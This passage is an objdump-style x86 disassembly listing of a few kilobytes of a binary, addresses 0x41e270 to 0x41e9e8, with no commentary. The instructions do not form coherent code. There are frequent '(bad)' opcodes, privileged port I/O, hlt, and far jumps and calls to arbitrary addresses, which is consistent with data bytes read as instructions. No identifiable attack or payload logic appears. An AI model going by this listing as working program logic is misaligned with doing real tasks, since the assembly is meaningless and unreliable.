  41e270:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e271:	int3   
  41e272:	(bad)  
  41e273:	xor    dh,al
  41e275:	xor    ecx,DWORD PTR [ebp-0x65674caf]
  41e27b:	xor    edi,edx
  41e27d:	ins    DWORD PTR es:[edi],dx
  41e27e:	xor    DWORD PTR [edi],eax
  41e280:	pop    esi
  41e281:	push   es
  41e282:	add    eax,0x35958607
  41e287:	es iret 
  41e289:	out    dx,eax
  41e28a:	(bad)  
  41e28b:	popf   
  41e28c:	test   eax,0xdc396766
  41e291:	mov    ebp,0x629a6800
  41e296:	test   eax,0x27fa8811
  41e29b:	jbe    0x41e22f
  41e29d:	pop    esp
  41e29e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e29f:	xchg   esi,eax
  41e2a0:	ret    
  41e2a1:	inc    ebx
  41e2a2:	inc    esp
  41e2a3:	push   ebx
  41e2a4:	loop   0x41e25a
  41e2a6:	scas   eax,DWORD PTR es:[edi]
  41e2a7:	repnz adc al,0xdc
  41e2aa:	or     bh,BYTE PTR [esi-0xd]
  41e2ad:	pop    ebx
  41e2ae:	lds    esp,FWORD PTR [ecx+0x3c]
  41e2b1:	stc    
  41e2b2:	ja     0x41e2a3
  41e2b4:	mov    esp,0xc02f00f3
  41e2b9:	mov    dh,BYTE PTR [esi+0x78]
  41e2bc:	bound  ebx,QWORD PTR [ecx+0x59c243e7]
  41e2c2:	and    al,0x20
  41e2c4:	out    0x4b,eax
  41e2c6:	cmc    
  41e2c7:	jecxz  0x41e2d4
  41e2c9:	inc    ebp
  41e2ca:	pop    edi
  41e2cb:	xchg   edx,eax
  41e2cc:	push   0xffffff94
  41e2ce:	xor    edx,DWORD PTR [eax]
  41e2d0:	call   0x9a4cf67f
  41e2d5:	out    dx,eax
  41e2d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2d7:	sub    bl,ah
  41e2d9:	jl     0x41e336
  41e2db:	jmp    0x9d636386
  41e2e0:	scas   al,BYTE PTR es:[edi]
  41e2e1:	cmc    
  41e2e2:	fs sub eax,0x4b2427cd
  41e2e8:	jcxz   0x41e323
  41e2eb:	mov    cl,0x93
  41e2ed:	pop    eax
  41e2ee:	dec    ebp
  41e2ef:	lds    ebp,FWORD PTR [ecx-0x2]
  41e2f2:	loopne 0x41e32e
  41e2f4:	sub    eax,0x7587c0e5
  41e2f9:	add    BYTE PTR ds:0x747377ea,0x5a
  41e300:	mov    ebx,0x7fe1f32d
  41e305:	dec    eax
  41e306:	rcl    esp,cl
  41e308:	mov    ah,ch
  41e30a:	int3   
  41e30b:	mov    bl,0x31
  41e30d:	dec    ebx
  41e30e:	xor    al,0x68
  41e310:	and    eax,0xabeb8caa
  41e315:	ror    BYTE PTR [edx-0x1a],cl
  41e318:	dec    esi
  41e319:	mov    ds:0x549ee911,al
  41e31e:	fsubr  DWORD PTR gs:[eax+0x31aeb81d]
  41e325:	inc    ecx
  41e326:	dec    esi
  41e327:	repnz and esp,0x46
  41e32b:	mov    esi,0xae921e6
  41e330:	or     eax,0x7397fe45
  41e335:	jge    0x41e352
  41e337:	push   ebx
  41e338:	retf   
  41e339:	stos   BYTE PTR es:[edi],al
  41e33a:	leave  
  41e33b:	lods   eax,DWORD PTR ds:[esi]
  41e33c:	push   0xc3ffbf58
  41e341:	fsub   st(0),st
  41e343:	fdiv   QWORD PTR [esi-0x30]
  41e346:	test   BYTE PTR [edi],dl
  41e348:	mov    eax,esp
  41e34a:	push   edx
  41e34b:	add    BYTE PTR [eax],bl
  41e34d:	mov    eax,ds:0x896e1874
  41e352:	out    0x52,eax
  41e354:	mov    dh,0x93
  41e356:	jge    0x41e32e
  41e358:	ins    DWORD PTR es:[edi],dx
  41e359:	add    eax,DWORD PTR [edi]
  41e35b:	and    DWORD PTR [edx],0x3240dea9
  41e361:	sbb    eax,0x539d538
  41e366:	aam    0xb9
  41e368:	fistp  QWORD PTR [ebx+eiz*4]
  41e36b:	ret    0x2b27
  41e36e:	ins    DWORD PTR es:[edi],dx
  41e36f:	es loope 0x41e3b6
  41e372:	imul   BYTE PTR [ecx-0x66]
  41e375:	jl     0x41e3b2
  41e377:	mov    al,ds:0xab88f43c
  41e37c:	inc    ebp
  41e37d:	rcl    DWORD PTR [eax+0x20],1
  41e380:	pop    esp
  41e381:	inc    esi
  41e382:	in     al,dx
  41e383:	xlat   BYTE PTR gs:[ebx]
  41e385:	in     eax,0x98
  41e387:	sbb    bh,cl
  41e389:	jl     0x41e3c8
  41e38b:	jle    0x41e33e
  41e38d:	into   
  41e38e:	imul   DWORD PTR [esi+0x28e97501]
  41e394:	js     0x41e342
  41e396:	sub    edx,edi
  41e398:	mov    eax,0x4ae9d865
  41e39d:	jp     0x41e32f
  41e39f:	cwde   
  41e3a0:	icebp  
  41e3a1:	mov    cl,BYTE PTR [eax+0x36]
  41e3a4:	cmc    
  41e3a5:	sub    ebx,esp
  41e3a7:	add    eax,0xf122534a
  41e3ac:	inc    esp
  41e3ad:	inc    esp
  41e3ae:	mov    ebx,0xac538c27
  41e3b3:	or     DWORD PTR [eax-0x4f0c159b],esi
  41e3b9:	sub    al,0x56
  41e3bb:	jns    0x41e3a1
  41e3bd:	mov    esp,0xe99b1705
  41e3c2:	and    eax,0xdf86af62
  41e3c7:	and    eax,0x147abc58
  41e3cc:	shl    BYTE PTR [esi+0x17c1c0f7],1
  41e3d2:	jmp    0x9f208dda
  41e3d7:	mov    eax,0x4decdd16
  41e3dc:	mov    dl,0xb8
  41e3de:	cli    
  41e3df:	ja     0x41e450
  41e3e1:	ret    
  41e3e2:	pop    eax
  41e3e3:	xor    DWORD PTR [edx],0x51a01804
  41e3e9:	jecxz  0x41e3a9
  41e3eb:	fbld   TBYTE PTR [eax]
  41e3ed:	add    BYTE PTR [eax],al
  41e3ef:	add    BYTE PTR [eax],al
  41e3f1:	add    BYTE PTR [eax-0x7de0740],al
  41e3f7:	cmp    ecx,ebx
  41e3f9:	loope  0x41e3df
  41e3fb:	mov    esi,0x3718fc94
  41e400:	mov    BYTE PTR [edi+0x15f0d],cl
  41e406:	repz add al,0x0
  41e409:	add    BYTE PTR [ebp-0x48dc744a],ah
  41e40f:	mov    esi,0x17c3a521
  41e414:	cmp    BYTE PTR [ecx+0x2e],0xd1
  41e418:	outs   dx,DWORD PTR ds:[esi]
  41e419:	pop    ebp
  41e41a:	rol    dl,cl
  41e41c:	mov    ch,0xe7
  41e41e:	(bad)  
  41e41f:	xchg   esp,eax
  41e420:	mov    ds:0x5c96fa4,al
  41e425:	out    0x3f,al
  41e427:	popf   
  41e428:	mov    al,ds:0x78bcf80e
  41e42d:	gs imul esp,esp,0xffffff8a
  41e431:	pop    esi
  41e432:	data16 lahf 
  41e434:	fidivr DWORD PTR [esi+ecx*8-0x73]
  41e438:	popf   
  41e439:	or     al,0x2c
  41e43b:	mov    bh,0xb7
  41e43d:	in     al,0x67
  41e43f:	and    eax,0x32ee7a3c
  41e444:	mov    ch,0x30
  41e446:	push   ss
  41e447:	mov    eax,ds:0x2e0576b3
  41e44c:	fbld   TBYTE PTR [eax]
  41e44e:	scas   eax,DWORD PTR es:[edi]
  41e44f:	aad    0x2f
  41e451:	mov    eax,0x1637969f
  41e456:	ja     0x41e483
  41e458:	rcr    BYTE PTR [ecx],1
  41e45a:	push   ebp
  41e45b:	push   ss
  41e45c:	sbb    BYTE PTR [edx-0x73ba9792],bh
  41e462:	ins    DWORD PTR es:[edi],dx
  41e463:	xchg   edi,eax
  41e464:	(bad)  
  41e465:	jle    0x41e48b
  41e467:	js     0x41e4c9
  41e469:	nop
  41e46a:	and    BYTE PTR [edi+ebx*1-0x7c],ch
  41e46e:	pop    ss
  41e46f:	out    0x3e,al
  41e471:	mov    bl,0x6
  41e473:	sbb    eax,0x651ec554
  41e478:	push   0xffffffef
  41e47a:	jbe    0x41e4f3
  41e47c:	mov    WORD PTR [ecx+edi*8-0x39],ss
  41e480:	aad    0x3c
  41e482:	sub    DWORD PTR [edx-0x437b22e9],ebp
  41e488:	hlt    
  41e489:	xor    edi,DWORD PTR [ebx+0x18dab59f]
  41e48f:	mov    edi,0x8a67ad30
  41e494:	aaa    
  41e495:	test   eax,0x1c9758c9
  41e49a:	fsub   QWORD PTR [edx+esi*8-0xc221484]
  41e4a1:	(bad)  
  41e4a2:	or     edi,edx
  41e4a4:	xor    dh,BYTE PTR [ebx]
  41e4a6:	xchg   ebp,eax
  41e4a7:	jmp    0x8ebb:0x8c40d84e
  41e4ae:	cmp    ebx,DWORD PTR [esi]
  41e4b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4b1:	mov    cs,WORD PTR [ebp+0x200d7363]
  41e4b7:	mov    al,ds:0x3416a32d
  41e4bc:	and    edx,DWORD PTR [edx]
  41e4be:	test   al,0xb2
  41e4c0:	jle    0x41e520
  41e4c2:	stos   BYTE PTR es:[edi],al
  41e4c3:	and    BYTE PTR [edi-0x32faf20a],al
  41e4c9:	pop    ss
  41e4ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4cc:	dec    esp
  41e4cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e4ce:	pushf  
  41e4cf:	mov    eax,ds:0x64416f75
  41e4d4:	aad    0xc6
  41e4d6:	rcr    DWORD PTR [edx-0x6f72e2a3],0x10
  41e4dd:	inc    edx
  41e4de:	mov    al,0xf7
  41e4e0:	sbb    edi,eax
  41e4e2:	mov    dh,0x2b
  41e4e4:	into   
  41e4e5:	mov    ecx,0xffa6fb19
  41e4ea:	jb     0x41e477
  41e4ec:	lock jl 0x41e4f0
  41e4ef:	(bad)  
  41e4f1:	mov    bh,0x56
  41e4f3:	add    BYTE PTR ds:0xa29112c4,al
  41e4f9:	jge    0x41e510
  41e4fb:	pop    edx
  41e4fc:	dec    ebp
  41e4fd:	repz je 0x41e488
  41e500:	imul   esp,ebx,0x12
  41e503:	xchg   ecx,eax
  41e504:	xlat   BYTE PTR ds:[ebx]
  41e505:	xor    BYTE PTR [ebx+eax*1-0x4],0x93
  41e50a:	sahf   
  41e50b:	loopne 0x41e57d
  41e50d:	ret    0x96dd
  41e510:	jge    0x41e542
  41e512:	lea    ebx,[esi-0x14c54c27]
  41e518:	mov    ah,0x7c
  41e51a:	mov    ch,0xa5
  41e51c:	add    BYTE PTR [edx-0x27],0xf5
  41e520:	sub    edi,edx
  41e522:	nop
  41e523:	and    DWORD PTR [ebx-0x3b],edx
  41e526:	push   ecx
  41e527:	leave  
  41e528:	adc    BYTE PTR [edi],ah
  41e52a:	shl    eax,cl
  41e52c:	dec    esi
  41e52d:	bound  edi,QWORD PTR [eax-0x19]
  41e530:	sub    edx,DWORD PTR [edx+0x303e1246]
  41e536:	add    BYTE PTR [eax-0x4d8ed37a],dh
  41e53c:	jno    0x41e540
  41e53e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e53f:	ins    BYTE PTR es:[edi],dx
  41e540:	add    DWORD PTR ds:0xf717f94f,esi
  41e546:	cmp    al,0xb0
  41e548:	or     edi,0xa
  41e54b:	jmp    0x2b57:0x85afeced
  41e552:	int3   
  41e553:	call   0xa160ab26
  41e558:	jae    0x41e593
  41e55a:	jne    0x41e533
  41e55c:	dec    ebx
  41e55d:	pushf  
  41e55e:	adc    DWORD PTR [edx+0x5fce1e62],ecx
  41e564:	std    
  41e565:	or     eax,0x4d65bb62
  41e56a:	inc    ebp
  41e56c:	shl    ecx,cl
  41e56e:	fisubr WORD PTR [ecx+ebx*1+0x20]
  41e572:	call   DWORD PTR [ecx-0x7b431a68]
  41e578:	xchg   esi,eax
  41e579:	push   0xaf5045c6
  41e57e:	out    0xc8,ax
  41e581:	jmp    0xc1b8368d
  41e586:	aam    0x65
  41e588:	or     al,0x53
  41e58a:	xor    BYTE PTR [eax],ch
  41e58c:	sbb    al,BYTE PTR [edx+0x4e0acc6e]
  41e592:	sbb    al,0x14
  41e594:	cld    
  41e595:	pusha  
  41e596:	push   edi
  41e597:	stc    
  41e598:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e599:	sbb    eax,0xcc795ebf
  41e59e:	inc    ebx
  41e59f:	add    DWORD PTR [ecx],ecx
  41e5a1:	into   
  41e5a2:	push   es
  41e5a3:	scas   al,BYTE PTR es:[edi]
  41e5a4:	je     0x41e579
  41e5a6:	add    esp,DWORD PTR [ebx+0x91695a5]
  41e5ac:	and    ebx,DWORD PTR [esi+0x4a]
  41e5af:	jmp    0x41e54e
  41e5b1:	out    dx,al
  41e5b2:	mov    dh,0x43
  41e5b4:	ror    DWORD PTR [esi+0x12],0x18
  41e5b8:	add    ah,cl
  41e5ba:	js     0x41e597
  41e5bc:	xchg   ecx,eax
  41e5bd:	loop   0x41e631
  41e5bf:	loope  0x41e61c
  41e5c1:	frstor [esi+0x57]
  41e5c4:	mov    ds:0x8d08324f,eax
  41e5c9:	xchg   esi,eax
  41e5ca:	and    bh,BYTE PTR [eax-0x52]
  41e5cd:	inc    ebx
  41e5ce:	test   DWORD PTR [edi],edi
  41e5d0:	ret    
  41e5d1:	daa    
  41e5d2:	sub    al,0x54
  41e5d4:	inc    edi
  41e5d5:	pop    es
  41e5d6:	mov    dh,0xf5
  41e5d8:	fs ja  0x41e602
  41e5db:	jne    0x41e5df
  41e5dd:	sbb    eax,0xa5f06fbf
  41e5e2:	jmp    0x41e5fc
  41e5e4:	(bad)  
  41e5e6:	jae    0x41e622
  41e5e8:	out    0x21,al
  41e5ea:	(bad)  
  41e5eb:	jb     0x41e65c
  41e5ed:	retf   
  41e5ee:	cld    
  41e5ef:	add    bl,dh
  41e5f1:	and    BYTE PTR [esi+0x11ca85e1],al
  41e5f7:	push   ds
  41e5f8:	sub    ecx,ebx
  41e5fa:	call   FWORD PTR [ecx-0x72409085]
  41e600:	sub    BYTE PTR [ecx+0x27bf17c1],dl
  41e606:	aaa    
  41e607:	out    0xe,al
  41e609:	xor    eax,0x46b7e400
  41e60e:	in     al,0x25
  41e610:	push   ebx
  41e611:	imul   esi,DWORD PTR [ebp+0x1e5bf017],0xc4abd6c7
  41e61b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e61c:	push   ds
  41e61d:	pop    ds
  41e61e:	jae    0x41e698
  41e620:	xor    eax,0x67de4f18
  41e625:	hlt    
  41e626:	and    edx,ebp
  41e628:	xchg   DWORD PTR [ebx+0x643f853a],eax
  41e62e:	rcl    DWORD PTR [esi-0x1],1
  41e631:	jmp    0x41e63b
  41e633:	aam    0x5d
  41e635:	sar    BYTE PTR [eax+0x7527d873],1
  41e63b:	add    eax,0x640c92d1
  41e640:	hlt    
  41e641:	and    esi,DWORD PTR [edx]
  41e643:	pusha  
  41e644:	(bad)  
  41e645:	gs dec eax
  41e647:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e648:	test   eax,0xbac97f74
  41e64d:	jbe    0x41e675
  41e64f:	adc    BYTE PTR [eax],al
  41e651:	xlat   BYTE PTR ds:[ebx]
  41e652:	into   
  41e653:	push   eax
  41e654:	or     edi,DWORD PTR [esi]
  41e656:	aam    0x5
  41e658:	mov    cl,0x9c
  41e65a:	(bad)  
  41e65c:	dec    ebx
  41e65d:	add    cl,BYTE PTR ds:0xf1500b0b
  41e663:	std    
  41e664:	xor    al,0x2
  41e666:	call   0x5b67c7e3
  41e66b:	popa   
  41e66c:	xchg   ebx,eax
  41e66d:	rcr    DWORD PTR [eax+edx*4],1
  41e670:	loopne 0x41e6e2
  41e672:	push   ds
  41e673:	ss xchg ebx,ebp
  41e676:	and    esi,DWORD PTR [ebx+ebp*4-0x4f46f690]
  41e67d:	inc    ebx
  41e67e:	jnp    0x41e6a0
  41e680:	jns    0x41e6cf
  41e682:	fld    DWORD PTR [eax]
  41e684:	call   0xaed9:0x3fecd92c
  41e68b:	pop    esi
  41e68c:	nop
  41e68d:	(bad)  
  41e68e:	shr    DWORD PTR [edx+0x21],0x5
  41e692:	ins    BYTE PTR es:[edi],dx
  41e693:	out    0x4a,eax
  41e695:	arpl   WORD PTR [edx+edi*1+0x1aedff2d],dx
  41e69c:	add    ecx,DWORD PTR [eax]
  41e69e:	bound  edx,QWORD PTR [esi-0x3a76cbe]
  41e6a4:	xchg   DWORD PTR [ecx-0x53212725],esp
  41e6aa:	push   0x82e2fa20
  41e6af:	iret   
  41e6b0:	arpl   WORD PTR [edi+ebx*2],dx
  41e6b3:	ror    DWORD PTR [ebx-0x2bd2b30d],0xe2
  41e6ba:	jns    0x41e6fb
  41e6bc:	ret    
  41e6bd:	mov    DWORD PTR [esp],esi
  41e6c0:	cmp    eax,DWORD PTR ds:0x81611779
  41e6c6:	push   edx
  41e6c7:	and    al,0x6a
  41e6c9:	call   0xb44d4d82
  41e6ce:	push   ds
  41e6cf:	cmp    DWORD PTR [ebx+esi*4-0x57],ecx
  41e6d3:	std    
  41e6d4:	push   fs
  41e6d6:	jmp    0xc74e91a7
  41e6db:	cmp    eax,0x75f7d678
  41e6e0:	jnp    0x41e6e9
  41e6e2:	arpl   WORD PTR [ebx],dx
  41e6e4:	int    0x6f
  41e6e6:	repnz xchg ebx,eax
  41e6e8:	and    eax,0x79d08dbb
  41e6ed:	xor    BYTE PTR ds:0x3ed7d079,dh
  41e6f3:	ret    0xd01c
  41e6f6:	sar    BYTE PTR [esi+0xd0113af],1
  41e6fc:	mov    esp,0x9d0e15b5
  41e701:	xor    esp,eax
  41e703:	add    DWORD PTR [esi-0x24],esi
  41e706:	adc    eax,0xdca449d7
  41e70b:	cmp    DWORD PTR [ecx],esi
  41e70d:	pusha  
  41e70e:	jo     0x41e748
  41e710:	aaa    
  41e711:	mov    WORD PTR [eax],?
  41e713:	mov    ah,0xd2
  41e715:	dec    eax
  41e716:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e717:	sbb    al,0x65
  41e719:	push   ebx
  41e71a:	mov    ch,0xda
  41e71c:	aam    0x38
  41e71e:	outs   dx,DWORD PTR ds:[esi]
  41e71f:	in     al,0x92
  41e721:	std    
  41e722:	adc    eax,0x60787872
  41e727:	pop    ebx
  41e728:	adc    DWORD PTR [esi+0x60],esp
  41e72b:	rcr    DWORD PTR ds:0x93035951,0x94
  41e732:	lods   eax,DWORD PTR ds:[esi]
  41e733:	jmp    0xae8a:0x6e849aa3
  41e73a:	sti    
  41e73b:	retf   0x37e0
  41e73e:	xchg   esi,eax
  41e73f:	sbb    edi,0xffffffb8
  41e742:	adc    ebp,DWORD PTR [esp+eax*2+0x1af3aa15]
  41e749:	and    BYTE PTR [edx-0x4b],dh
  41e74c:	data16 sahf 
  41e74e:	push   ds
  41e74f:	inc    esi
  41e750:	inc    esp
  41e751:	ja     0x41e704
  41e753:	sub    DWORD PTR [edx],edi
  41e755:	in     eax,0xf2
  41e757:	xor    ecx,DWORD PTR es:[edx-0x3d]
  41e75b:	push   ebx
  41e75c:	outs   dx,DWORD PTR ds:[esi]
  41e75d:	int3   
  41e75e:	jno    0x41e773
  41e760:	mov    ah,0x66
  41e762:	dec    esi
  41e763:	in     eax,0x8a
  41e765:	mov    eax,0x2d533b52
  41e76a:	and    bh,BYTE PTR [ebx]
  41e76c:	leave  
  41e76d:	push   0x2fe93dc2
  41e772:	stos   BYTE PTR es:[edi],al
  41e773:	jg     0x41e6fa
  41e775:	add    al,0x4e
  41e777:	mov    cl,0xfb
  41e779:	scas   al,BYTE PTR es:[edi]
  41e77a:	or     bh,BYTE PTR ds:0x48390e7b
  41e780:	fistp  QWORD PTR [edi]
  41e782:	out    0xfe,al
  41e784:	xlat   BYTE PTR ds:[ebx]
  41e785:	fsub   st,st(3)
  41e787:	(bad)  
  41e788:	add    eax,0xbd4b445
  41e78d:	inc    ebp
  41e78e:	fcomip st,st(7)
  41e790:	enter  0x6630,0xc8
  41e794:	mov    ecx,0x40e66d8c
  41e799:	jo     0x41e7d4
  41e79b:	add    BYTE PTR [eax],dh
  41e79d:	jno    0x41e746
  41e79f:	push   ebx
  41e7a0:	inc    DWORD PTR [eax]
  41e7a2:	out    0x7f,eax
  41e7a4:	out    0xd2,eax
  41e7a6:	int3   
  41e7a7:	fmul   DWORD PTR [ecx]
  41e7a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7aa:	mov    eax,0x415a5254
  41e7af:	xchg   ebx,eax
  41e7b0:	push   edi
  41e7b1:	jne    0x41e738
  41e7b3:	out    dx,eax
  41e7b4:	xchg   BYTE PTR [ebp+edi*2-0x2393bf79],ch
  41e7bb:	out    0xe2,eax
  41e7bd:	jg     0x41e7d1
  41e7bf:	jmp    0xa41d:0xd248fa2a
  41e7c6:	pop    ds
  41e7c7:	xor    eax,0xe0af5779
  41e7cc:	ds inc esp
  41e7ce:	sar    DWORD PTR [ecx+0x7bb5d755],1
  41e7d4:	add    BYTE PTR ds:0xc4535169,bh
  41e7da:	clc    
  41e7db:	sbb    eax,0xee8b19f3
  41e7e0:	jge    0x41e79a
  41e7e2:	ffreep st(2)
  41e7e4:	(bad)  
  41e7e5:	push   esp
  41e7e6:	inc    edx
  41e7e7:	xor    eax,0xcc6f1ed5
  41e7ec:	mov    al,0x15
  41e7ee:	fistp  WORD PTR [eax+0xa]
  41e7f1:	jecxz  0x41e864
  41e7f3:	pushf  
  41e7f4:	fdivr  QWORD PTR ds:0xcf9496ca
  41e7fa:	cmp    eax,0x47057fec
  41e7ff:	mov    al,0x34
  41e801:	(bad)  [edi]
  41e803:	mov    ecx,0x45b3b8c6
  41e808:	shl    BYTE PTR [ebp-0x6a82a0fa],1
  41e80e:	pop    gs
  41e810:	jg     0x41e836
  41e812:	in     al,dx
  41e813:	(bad)  
  41e814:	(bad)  
  41e815:	push   esp
  41e816:	jge    0x41e806
  41e818:	push   eax
  41e819:	lock inc ebp
  41e81b:	mov    BYTE PTR [esi],dh
  41e81d:	mov    eax,ds:0x4956e766
  41e822:	pop    eax
  41e823:	ret    0x3688
  41e826:	xchg   ecx,eax
  41e827:	inc    eax
  41e828:	dec    ebp
  41e829:	adc    bh,BYTE PTR [eax+0x24d1f90c]
  41e82f:	or     dh,BYTE PTR [edx]
  41e831:	push   edx
  41e832:	pop    ebx
  41e833:	(bad)  
  41e834:	push   0x63
  41e836:	retf   
  41e837:	xor    ecx,DWORD PTR [ebx-0x41]
  41e83a:	aas    
  41e83b:	pop    eax
  41e83c:	ficom  DWORD PTR [edi+0x3c]
  41e83f:	and    esp,DWORD PTR [ebx-0x76]
  41e842:	dec    ebx
  41e843:	hlt    
  41e844:	push   esi
  41e845:	adc    edi,ebp
  41e847:	dec    esp
  41e848:	test   DWORD PTR [esp+edx*2],ebx
  41e84b:	div    DWORD PTR [edi-0x2b]
  41e84e:	jo     0x41e7e0
  41e850:	xchg   esp,eax
  41e851:	fs mov dh,0x14
  41e854:	aam    0x23
  41e856:	(bad)  
  41e857:	jmp    DWORD PTR [ecx+0x67]
  41e85a:	cld    
  41e85b:	add    bl,BYTE PTR [esp+edi*1]
  41e85e:	enter  0x51b,0xb0
  41e862:	cmp    al,0xd7
  41e864:	lods   eax,DWORD PTR ds:[esi]
  41e865:	lock sub ebp,edi
  41e868:	push   esi
  41e869:	mov    dh,BYTE PTR [esi+0x574631b2]
  41e86f:	add    dl,dh
  41e871:	xchg   ebx,eax
  41e872:	jge    0x41e865
  41e874:	adc    dh,al
  41e876:	mov    ch,0x38
  41e878:	sub    ah,BYTE PTR [ecx+0x8]
  41e87b:	sbb    dh,dl
  41e87d:	add    ebp,0x6c34c516
  41e883:	fdivr  DWORD PTR [edx]
  41e885:	ins    DWORD PTR es:[edi],dx
  41e886:	xchg   ebp,eax
  41e887:	fsubr  st(5),st
  41e889:	je     0x41e877
  41e88b:	lock sbb al,0xcd
  41e88e:	stos   BYTE PTR es:[edi],al
  41e88f:	ins    DWORD PTR es:[edi],dx
  41e890:	xor    al,0x93
  41e892:	inc    edi
  41e893:	call   0x58b6dca1
  41e898:	bound  esp,QWORD PTR [ecx]
  41e89a:	xchg   ecx,eax
  41e89b:	jmp    0x41e895
  41e89d:	xchg   edx,eax
  41e89e:	mov    ah,0xb7
  41e8a0:	fdivr  st,st(1)
  41e8a2:	cld    
  41e8a3:	inc    ebp
  41e8a4:	cmp    edx,ecx
  41e8a6:	int    0xa7
  41e8a8:	mov    al,0xc2
  41e8aa:	jmp    0x1c61:0xb48fd925
  41e8b1:	dec    edx
  41e8b2:	out    dx,al
  41e8b3:	and    al,0x11
  41e8b5:	stos   DWORD PTR es:[edi],eax
  41e8b6:	test   eax,0x5818f887
  41e8bb:	sub    bl,ah
  41e8bd:	add    esp,DWORD PTR [edi]
  41e8bf:	lock xor al,0x26
  41e8c2:	push   0x43a04551
  41e8c7:	add    al,0x44
  41e8c9:	push   esi
  41e8ca:	dec    ecx
  41e8cb:	mov    DWORD PTR [eax+ecx*4],0x4f05c226
  41e8d2:	push   esp
  41e8d3:	dec    eax
  41e8d4:	dec    ecx
  41e8d5:	into   
  41e8d6:	fs push edi
  41e8d8:	mov    WORD PTR [ebx-0x8],fs
  41e8db:	jge    0x41e8e7
  41e8dd:	xchg   DWORD PTR [eax+esi*1],ecx
  41e8e0:	shl    BYTE PTR [ebx],1
  41e8e2:	or     DWORD PTR [esi],0xffffffb0
  41e8e5:	cli    
  41e8e6:	aad    0x74
  41e8e8:	mov    esp,0x423eeca9
  41e8ed:	ret    
  41e8ee:	pop    ss
  41e8ef:	dec    eax
  41e8f0:	mov    bl,0x8
  41e8f2:	jg     0x41e89a
  41e8f4:	ins    BYTE PTR es:[edi],dx
  41e8f5:	and    al,0x69
  41e8f7:	int    0xb7
  41e8f9:	push   ecx
  41e8fa:	add    dl,BYTE PTR [eax+0xd7]
  41e900:	add    BYTE PTR [eax],al
  41e902:	jg     0x41e97c
  41e904:	mov    ecx,0xffd5bf55
  41e909:	jp     0x41e931
  41e90b:	ret    0x676d
  41e90e:	push   ecx
  41e90f:	inc    ecx
  41e910:	push   cs
  41e911:	adc    DWORD PTR [eax],eax
  41e913:	add    DWORD PTR fs:[eax],eax
  41e916:	repz add al,0x0
  41e919:	add    BYTE PTR [esi+0x7d],bl
  41e91c:	jg     0x41e8e7
  41e91e:	lods   eax,DWORD PTR ds:[esi]
  41e91f:	jae    0x3d2ee5ae
  41e925:	and    eax,0x555c16bf
  41e92a:	ss inc esi
  41e92c:	jne    0x41e96d
  41e92e:	leave  
  41e92f:	dec    edi
  41e930:	leave  
  41e931:	adc    DWORD PTR cs:[esi],0x61
  41e935:	ins    DWORD PTR es:[edi],dx
  41e936:	popf   
  41e937:	dec    ecx
  41e938:	arpl   WORD PTR [esi-0x32],sp
  41e93b:	mov    cl,0x9c
  41e93d:	gs js  0x41e919
  41e940:	loope  0x41e9b6
  41e942:	sbb    al,dl
  41e944:	xchg   ecx,eax
  41e945:	mov    ah,0x17
  41e947:	in     eax,0xb8
  41e949:	push   ecx
  41e94a:	in     eax,dx
  41e94b:	sbb    eax,0x5953a804
  41e950:	mov    bl,0x6
  41e952:	enter  0x640b,0x27
  41e956:	dec    ebx
  41e957:	xor    DWORD PTR [edi],ebx
  41e959:	aam    0x78
  41e95b:	xor    eax,0x67937635
  41e960:	xor    dl,al
  41e962:	out    dx,al
  41e963:	jo     0x41e988
  41e965:	mov    ds:0x2e68a13f,al
  41e96a:	cmp    BYTE PTR [eax+eiz*8],ah
  41e96d:	xor    eax,0x4bec6510
  41e972:	dec    esi
  41e973:	scas   eax,DWORD PTR es:[edi]
  41e974:	sub    BYTE PTR [eax+eax*1],dh
  41e977:	and    eax,0xe15fca5b
  41e97c:	cwde   
  41e97d:	fwait
  41e97e:	add    BYTE PTR [edx+0x3f],0x22
  41e982:	scas   al,BYTE PTR es:[edi]
  41e983:	ds imul ebx,edi,0xf97ab899
  41e98a:	sbb    ebx,DWORD PTR [esi]
  41e98c:	mov    fs,ecx
  41e98e:	and    bh,ah
  41e990:	cs loopne 0x41ea07
  41e993:	clc    
  41e994:	jnp    0x41e96b
  41e996:	dec    edx
  41e997:	repnz adc dh,BYTE PTR [ebx+0x5a398dbe]
  41e99e:	cli    
  41e99f:	sub    DWORD PTR [eax+0x5cee58b6],0x29
  41e9a6:	jns    0x41e9d0
  41e9a8:	ret    
  41e9a9:	lods   al,BYTE PTR ds:[esi]
  41e9aa:	add    al,0xeb
  41e9ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9ad:	add    al,0x46
  41e9af:	or     DWORD PTR [ebx],edx
  41e9b1:	and    BYTE PTR [eax],dl
  41e9b3:	mov    es,WORD PTR [edi]
  41e9b5:	nop
  41e9b6:	xor    eax,0x36e17ee8
  41e9bb:	dec    eax
  41e9bc:	ss jns 0x41ea03
  41e9bf:	lods   al,BYTE PTR ds:[esi]
  41e9c0:	sbb    ecx,DWORD PTR [ebx]
  41e9c2:	lods   eax,DWORD PTR ds:[esi]
  41e9c3:	or     ch,BYTE PTR [edi+0x39abf128]
  41e9c9:	das    
  41e9ca:	cdq    
  41e9cb:	push   ecx
  41e9cc:	push   ds
  41e9cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9ce:	mov    ebp,0xf347e56e
  41e9d3:	cli    
  41e9d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e9d5:	cli    
  41e9d6:	adc    BYTE PTR [edi],ch
  41e9d8:	js     0x41ea21
  41e9da:	in     al,dx
  41e9db:	jno    0x41e95e
  41e9dd:	dec    eax
  41e9de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e9df:	sbb    esi,0xea6630f
  41e9e5:	icebp  
  41e9e6:	mov    cs,WORD PTR [esi]
  41e9e8:	retf   0xcf90
